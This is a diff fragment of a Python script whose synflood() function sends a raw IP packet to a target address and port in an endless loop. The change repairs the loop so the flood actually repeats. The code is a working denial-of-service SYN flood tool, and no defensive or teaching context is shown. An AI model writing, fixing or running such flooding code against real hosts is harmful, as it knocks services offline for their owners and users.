@@ -36,9 +36,10 @@ def packet():
     ip.calculate_checksum()   
 
 def synflood():
-    a = s.sendto(ip.get_packet(),(dst_ip,dst_port))
+    ipacket= ip.get_packet()
+    dstip,dstport = dst_ip,dst_port
     for _ in repeat(None): #使用迭代器实现循环
-        a
+        s.sendto(ipacket,(dstip,dstport))
 
 if __name__=='__main__':
     packet()
